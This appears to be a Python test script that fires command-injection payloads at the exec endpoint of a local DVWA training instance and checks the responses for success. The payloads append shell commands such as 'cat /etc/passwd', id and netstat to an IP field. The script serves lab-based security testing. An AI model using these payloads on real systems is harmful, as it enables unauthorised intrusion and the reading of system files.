import requests
from bs4 import BeautifulSoup

def test_command_injection(session, base_url):
    payloads = [
        "127.0.0.1; ls -la",
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1; uname -a",
        "127.0.0.1; id",
        "127.0.0.1; whoami",
        "127.0.0.1; ps aux",
        "127.0.0.1; netstat -an",
        "127.0.0.1; ping -c 4 127.0.0.1"
    ]
    
    endpoint = 'vulnerabilities/exec/'

    for payload in payloads:
        data = {'ip': payload, 'Submit': 'Submit'}
        response = session.post(base_url + endpoint, data=data)
        
        # Debug: Print response content
        print(f"Response from {base_url}{endpoint} with payload {payload}:")
        print(response.text)
        
        if "total" in response.text:
            print(f"Command Injection vulnerability detected at {base_url}{endpoint} with payload {data}")
        else:
            print(f"No Command Injection vulnerability detected at {base_url}{endpoint}")

# Example usage
if __name__ == "__main__":
    session = requests.Session()
    base_url = "http://127.0.0.1/DVWA/"  # Adjusted for local DVWA instance
    
    # Ensure the session is logged in and security level is set to low
    from set_security import set_dvwa_security
    if set_dvwa_security(session, base_url, 'low'):
        test_command_injection(session, base_url)
